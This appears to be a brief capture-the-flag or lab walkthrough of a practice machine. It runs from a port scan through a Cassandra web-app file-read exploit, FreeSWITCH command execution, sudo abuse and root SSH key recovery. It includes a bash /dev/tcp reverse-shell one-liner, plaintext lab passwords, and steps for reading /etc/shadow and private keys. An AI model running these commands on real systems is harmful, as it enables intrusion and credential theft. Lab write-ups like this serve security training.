PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3000/tcp open  ppp
8021/tcp open  ftp-proxy

on port 3000 running cassandra 
<img width="1929" height="595" alt="image" src="https://github.com/user-attachments/assets/4064ba3a-0777-4370-b392-caf27dff3a2c" />

used file read exploit
https://www.exploit-db.com/exploits/49362
<img width="920" height="548" alt="image" src="https://github.com/user-attachments/assets/5df1f2b1-acc0-4860-b530-157208a6966f" />
<img width="696" height="79" alt="image" src="https://github.com/user-attachments/assets/76395f84-72c3-43b2-822f-fd01b8ba3651" />

from exploit retrieved
cassie:SecondBiteTheApple330

that password was useless so moved on to 8021 which was freeswitch but wrong password
<img width="525" height="72" alt="image" src="https://github.com/user-attachments/assets/81dcf43f-020c-4abc-ae7b-e9121a0c0341" />

used the cass exploit to retrieve the freeswitch password. StrongClueConEight021
<img width="983" height="193" alt="image" src="https://github.com/user-attachments/assets/bd2be8cf-5a45-47d8-8a62-9c3fdf7ebef9" />

python3 freeswitch.py $ip "bash -c 'bash -i >& /dev/tcp/192.168.45.224/80 0>&1'"
<img width="587" height="71" alt="image" src="https://github.com/user-attachments/assets/ef659429-32e4-431b-ac4a-efa3a7e885a5" />

in cassie home theres id_rsa
<img width="439" height="56" alt="image" src="https://github.com/user-attachments/assets/f4752fc2-f2db-48b0-8662-1052365815b9" />

using the file read cassandra exploit i can read the idrsa
<img width="815" height="509" alt="image" src="https://github.com/user-attachments/assets/28831bd5-1633-41a5-bdb3-f69cfc32a205" />
ended up not working??

just su into cassie using SecondBiteTheApple330. sudo -l
<img width="1048" height="128" alt="image" src="https://github.com/user-attachments/assets/f4192762-6f4a-427c-87c2-dd2260247930" />

run the cassandra app. because sudo, it will run as root. so when we use the cass file read exploit again it will have read perms
<img width="1232" height="251" alt="image" src="https://github.com/user-attachments/assets/f43a0746-0d62-4aca-8fb9-f68711783d7c" />

now we can read etc shadow file. hashes couldnt be cracked
<img width="1446" height="530" alt="image" src="https://github.com/user-attachments/assets/0fc481b3-60c9-44d2-955b-7d28eef7dcac" />

check bash history of anthony. his id_rsa key is for root
<img width="919" height="170" alt="image" src="https://github.com/user-attachments/assets/41650ee3-e4db-4012-883c-b7797ee37de3" />


